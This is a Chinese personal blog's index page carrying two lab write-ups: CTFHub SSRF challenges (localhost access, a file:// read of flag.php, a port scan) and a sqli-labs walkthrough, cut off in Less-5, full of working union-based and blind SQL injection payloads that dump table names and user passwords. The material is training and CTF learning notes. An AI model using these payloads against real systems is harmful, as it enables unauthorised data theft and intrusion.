<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"10vexh.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="水至清则无鱼">
<meta property="og:type" content="website">
<meta property="og:title" content="good good study,day day up.">
<meta property="og:url" content="http://10vexh.top/index.html">
<meta property="og:site_name" content="good good study,day day up.">
<meta property="og:description" content="水至清则无鱼">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="10vexh">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://10vexh.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>good good study,day day up.</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">good good study,day day up.</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://10vexh.top/2022/01/24/CTFHub-Web-SSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="10vexh">
      <meta itemprop="description" content="水至清则无鱼">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="good good study,day day up.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/24/CTFHub-Web-SSRF/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-24 12:25:08" itemprop="dateCreated datePublished" datetime="2022-01-24T12:25:08+08:00">2022-01-24</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CTFHub-Web-SSRF"><a href="#CTFHub-Web-SSRF" class="headerlink" title="CTFHub-Web-SSRF"></a>CTFHub-Web-SSRF</h1><p>​        SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>​        SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p>题目要求：尝试访问位于127.0.0.1的flag.php吧</p>
<p>url进行了重定向，直接访问127.0.0.1下的flag.php即可。</p>
<p>payload：<code>?url=127.0.0.1/flag.php</code></p>
<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p>题目要求：尝试去读取一下Web目录下的flag.php吧</p>
<p>先用上一题的payload进行尝试，发现返回的是三个问号。</p>
<p>因此在本题用到<code>file://</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///   -- 本地文件传输协议，主要用于访问本地计算机中的文件</span><br></pre></td></tr></table></figure>

<p>web的默认目录一般为<code>/var/www/html</code>因此直接访问即可。</p>
<p>payload：<code>?url=file:///var/www/html/flag.php</code></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>题目要求：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦。</p>
<p>直接开bp爆破。设置范围为8000到9000.</p>
<p>我的在8405回显了flag。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://10vexh.top/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="10vexh">
      <meta itemprop="description" content="水至清则无鱼">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="good good study,day day up.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/02/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">sql-lab刷题记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-02 21:15:03" itemprop="dateCreated datePublished" datetime="2022-01-02T21:15:03+08:00">2022-01-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-01-23 16:43:31" itemprop="dateModified" datetime="2022-01-23T16:43:31+08:00">2022-01-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="sql-lab刷题记录"><a href="#sql-lab刷题记录" class="headerlink" title="sql-lab刷题记录"></a>sql-lab刷题记录</h1><p>​        sqllab是atao师傅推荐我用来学sql的，网上已经有很多现成的writeup，写的知识点也比我完善，我只是用来简单记录一下自己的学习的过程。搭建的方法也很简单，网上都有，记得php版本要在7.0以前，避免要更改sql的函数。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了方便后面做题，我先找到目标的数据库，然后在命令行中进行调试方便找到目标。</p>
<p>先是默认的账号密码进入</p>
<p>mysql -uroot -p123456</p>
<p>用<code>show databases;</code></p>
<p>找到默认的数据库security,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| dvwa               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| pikachu            |</span><br><span class="line">| security           |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>

<p>然后<code>use security</code>，进入数据库</p>
<p><code>show tables;</code></p>
<p>找到表users</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>

<p>在表中进行搜索，方便做题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where 1=1;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br></pre></td></tr></table></figure>



<h2 id="Less-1-GET-基于报错的单引号字符型注入"><a href="#Less-1-GET-基于报错的单引号字符型注入" class="headerlink" title="Less-1 GET-基于报错的单引号字符型注入"></a>Less-1 GET-基于报错的单引号字符型注入</h2><p>首先根据题目名字，尝试输入<code>?id=-1&#39;</code></p>
<p>返回了报错的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>然后我们进入源码中查看，发现其从中读入的数据，没有经过处理，直接读入</p>
<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
<p>LIMIT表示可以返回的记录数。</p>
<p>我们尝试在数据库中利用该语句进行查询，发现是否加’都能正常返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=1 limit 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<p>而如果输入<code>?id=1&#39;</code>加了额外的<code>&#39;</code>意味着会让sql语句进行提前闭合，从而报错</p>
<p><code>select * from users where id=&#39;1&#39;&#39; limit 0,1;</code></p>
<p>而我们将后面部分利用<code>?id=1&#39;#</code>注释掉，则可以正常返回空的查询。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<p>当我们输入1’# 的时候，回车还需要一个冒号作为闭合，因为系统读到#后，不会继续往下面读，默认下面的都是注释忽略了，进而达到绕过的目的。</p>
<p>因此我们可以考虑通过在1’后面加上自己想查询的东西，得到想要的答案。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">mysql&gt; select * from users where id=&#x27;1&#x27; order by 1,2,3,4#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>

<p>通过<code>?id=1&#39; order by 1,2,3--+</code>，发现其中存在三行,此时可以通过联合注入的方式进行查询。</p>
<p><code>?id=-1&#39; union select 1,2,3--+</code>发现在2，3的位置会进行回显。</p>
<p>因此我们可以开始注入了，一般的思路是获取字段数-&gt;数据库名-&gt;表名-&gt;列名-&gt;值</p>
<p>字段数就靠上面的order by进行猜解，或者通过union select直接尝试，直到遇到报错。</p>
<p>我们已知了有3列，而2，3列会回显，因此我们下一步进行查数据库名。</p>
<p>先在数据库里试一下。有几个常用的查询的默认</p>
<p>database()：当前网站使用的数据库</p>
<p>version()：当前Mysql的版本</p>
<p>user()：当前Mysql的用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select version(),user(),database()#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| id     | username       | password |</span><br><span class="line">+--------+----------------+----------+</span><br><span class="line">| 5.7.26 | root@localhost | security |</span><br><span class="line">+--------+----------------+----------+</span><br></pre></td></tr></table></figure>

<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,user(),database()--+</code>，进而得到数据库名和用户。</p>
<p>接着查询表。</p>
<p>同样先试一下</p>
<p>group_concat()：表示把一个分组的值串起来。</p>
<p>information_schema：mysql自带的信息数据库存在着存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#x27;security&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">| id | username | password                      |</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">|  1 | 2        | emails,referers,uagents,users |</span><br><span class="line">+----+----------+-------------------------------+</span><br></pre></td></tr></table></figure>

<p>因此我们再在网站中进行查询，<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#39;security&#39;--+</code>，得到表名。</p>
<p>再对user表进行查询。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#x27;security&#x27; and table_name=&#x27;users&#x27;#&#x27; limit 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">| id | username | password             |</span><br><span class="line">+----+----------+----------------------+</span><br><span class="line">|  1 | 2        | id,username,password |</span><br><span class="line">+----+----------+----------------------+</span><br></pre></td></tr></table></figure>

<p>再在网站中进行查询<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#39;security&#39; and table_name=&#39;users&#39;--+</code>，得到字段名。</p>
<p>最后查用户名和密码。(格式太丑不放了)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&#x27;-1&#x27; union select 1,group_concat(username),group_concat(password) from users#&#x27; limit 0,1;</span><br></pre></td></tr></table></figure>

<p>在网站中查询<code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code></p>
<p>会回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

<p>然后差不多就完了，接着下一题。</p>
<h2 id="Less-2-GET-基于报错的整型注入"><a href="#Less-2-GET-基于报错的整型注入" class="headerlink" title="Less-2 GET-基于报错的整型注入"></a>Less-2 GET-基于报错的整型注入</h2><p>这题与上一题看起来差不多，只在于一个<code>&#39;&#39;</code>的差别当我们以?<code>id=-1 or 1=1#</code>进行判断报错的时候i，发现返回了整个包裹的<code>&#39; or 1=1 LIMIT 0,1</code>所以可以判断我们多输入了一个<code>&#39;</code>,是多余的，查看代码源码也发现如此</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br></pre></td></tr></table></figure>

<p><code>?id=-1 union select 1,2,3#</code> 判断注入点</p>
<p><code>?id=-1 union select 1,database(),version()#</code> 取数据库名</p>
<p><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;#</code>  取表名</p>
<p><code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#</code> 取列</p>
<p><code>?id=-1 union select 1,group_concat(username),group_concat(password) from users#</code> 取内容</p>
<h2 id="Less-3-GET-基于报错的单引号变形注入"><a href="#Less-3-GET-基于报错的单引号变形注入" class="headerlink" title="Less-3 GET-基于报错的单引号变形注入"></a>Less-3 GET-基于报错的单引号变形注入</h2><p>同样用<code>?id=-1&#39; or 1=1#</code>测试，发现返回的错误为<code>&#39;) LIMIT 0,1</code>，证明这次的是用<code>)</code>进行包裹的。</p>
<p>再次查看源代码，发现确实。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第二题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br></pre></td></tr></table></figure>

<p>然后在这里我才意识到<code>?id=-1&#39; or 1=1#</code>是用不了的，而<code>?id=-1&#39; or 1=1--+</code>可以用，我本来以为<code>--+</code>一样是注释符，查了资料才发现，<code>--</code>并不是注释符，而<code>--</code>后还要加上空格，而web中<code>空格</code>和<code>+</code>等价，所以我们一般用<code>--+</code>，其他常用的注释符还有<code>/**/</code>和<code>#</code></p>
<p>所以这题我们用–+</p>
<p><code>?id=-1&#39;)  union select 1,2,3--+</code> 找注入点</p>
<p><code>?id=-1&#39;)  union select 1,database(),user()--+</code> 找数据库名</p>
<p><code>?id=-1&#39;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 取表名</p>
<p><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39;--+</code>  取列</p>
<p><code>?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取内容</p>
<h2 id="Less-4-GET-基于报错的双引号字符型注入"><a href="#Less-4-GET-基于报错的双引号字符型注入" class="headerlink" title="Less-4 GET-基于报错的双引号字符型注入"></a>Less-4 GET-基于报错的双引号字符型注入</h2><p>还是先试一下<code>?id=-1&#39; or 1=1#</code>，然后发现没有任何报错的反应，然后我选择直接看了源码，发现这次的代码与之前有所不同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第一题的</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">//第三题的</span><br><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br><span class="line">//第四题</span><br></pre></td></tr></table></figure>

<p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code> 表示在php中.是用来连接的，表示把$id存储的值加上一个双引号然后在赋值给$id 这个变量，很明显我们这题要用到双引号的绕过。</p>
<p>当我们将用<code>?id=1&quot;</code>进行报错的验证，会发现返回的错误为<code>&quot;1&quot;&quot;) LIMIT 0,1</code>，从而可以判断在该处要进行双引号和括号的闭合</p>
<p><code>?id=-1&quot;) union select 1,2,3--+</code> 找注入点</p>
<p><code>?id=-1&quot;) union select 1,database(),user()--+</code> 找数据库</p>
<p><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code> 找表名</p>
<p><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code> 找列名</p>
<p><code>?id=-1&quot;) union select 1,group_concat(username),group_concat(password) from users--+</code> 取数</p>
<h2 id="Less-5-GET-单引号字符型注入"><a href="#Less-5-GET-单引号字符型注入" class="headerlink" title="Less-5 GET-单引号字符型注入"></a>Less-5 GET-单引号字符型注入</h2><p>这题思路又和前面不一样了，我不会做，看了别的师傅的思路，好像有两种方法，一种是开始了盲注。另一个就是题目本来目的双注。</p>
<p>首先先用<code>?id=1&#39;</code>，返回了报错信息<code>&#39;1&#39;&#39; LIMIT 0,1</code>，证明是单引号的，然后我们当输入的语句逻辑是正确的时候，就You are in………..会返回<code>You are in...........</code> ，我们可以根据函数，来判断数据库名字。</p>
<p><code>?id=1’ and length(database())=8--+</code> 返回正确，表示数据库名长度为8.</p>
<p>接着一个字母一个字母判断。</p>
<p><code>?id=1&#39; and ascii(substr(database(),1,1))=1--+</code>  用ascii(字母)来判断这个字母ascii值为多少。substr()表示返回字符串的一部分</p>
<p>直接抓包进行判断，错误的返回length为964，正确的为948</p>
<p>发现在<code>?id=1&#39; and ascii(substr(database(),1,1))=115--+</code> 返回正确，可以判断第一个字母的ASCII码为<code>115</code>，对应<code>s</code>，每次更改一位，然后爆破出数据库为security。</p>
<p><code>?id=1&#39; and (select count(*) from information_schema.tables where table_schema=database())=4--+</code> 判断出有四个表。</p>
<p>在数据库中可以用<code>length(table_name)</code>，找出表长，再用limit切片判断长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(table_name) from information_schema.tables where table_schema=database() limit 0,1;</span><br><span class="line">+--------------------+</span><br><span class="line">| length(table_name) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  6 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6--+</code> 正常回显，则可以判断第一个表的长度。</p>
<p>同样进行爆破，然后发现第一个表的第一个字母为ascii等于101的</p>
<p><code>?id=1&#39; and (select ascii(substr(table_name,x,1)) from information_schema.tables where table_schema=database() limit y,1)=101--+</code></p>
<p>(x表示爆破的第几个字母的ascii，y表示爆破的第几个表)</p>
<p>然后，同理可以爆出存在的四个表为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+-------------------------+</span><br><span class="line">| emails                  |</span><br><span class="line">| referers                |</span><br><span class="line">| uagents                 |</span><br><span class="line">| users                   |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)=3--+</code>  判断出在这个表中有三个列</p>
<p><code>?id=1&#39; and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1)=2--+</code>  判断出第一个列的长度为2，以此类推找出三个列长度。</p>
<p><code>?id=1&#39; and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1)=117--+</code> 判断第二个列名字第一位为117。同样方法爆破。</p>
<p>然后判断出来存在的三个列为</p>
